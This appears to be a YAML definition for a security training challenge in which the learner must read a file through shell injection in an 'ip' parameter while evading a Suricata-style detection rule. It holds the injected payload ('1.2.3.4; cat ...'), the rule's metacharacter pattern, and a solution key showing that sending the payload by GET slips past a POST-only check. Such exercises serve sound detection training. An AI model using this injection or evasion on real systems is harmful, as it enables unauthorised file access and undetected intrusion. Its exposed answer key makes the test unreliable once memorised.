name: 'Shell Injection (Param) 1'
type: 'exploit'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  **Goal: Print the file `/app/dragon-detector-ai`**.

hints: []

target: detector

base_request: |-
  POST /detect-dragon.php HTTP/1.1
  Host: localhost
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 10

  ip=1.2.3.4; cat /app/dragon-detector-ai

solution: |-
  GET /detect-dragon.php?ip=1.2.3.4;cat+/app/dragon-detector-ai HTTP/1.1
  Host: localhost
  Content-Type: application/x-www-form-urlencoded

solution_note: Only checks POST, not GET

rules:
- >
  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "detect-dragon.php"; http.request_body; pcre: "/ip=[^&]*[\;|&`$()]/"; sid:123457; rev:1;)

expected_output: "This doesn't actually do anything"
